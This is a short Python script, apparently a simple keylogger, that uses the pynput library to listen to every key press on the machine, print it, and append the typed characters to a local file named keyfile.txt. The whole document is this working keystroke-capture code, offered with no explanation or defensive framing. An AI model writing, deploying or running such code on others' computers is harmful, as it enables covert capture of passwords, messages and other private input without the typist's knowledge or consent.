from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open('keyfile.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print('Char_error.1: unregistered key stroke; check console.log')


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()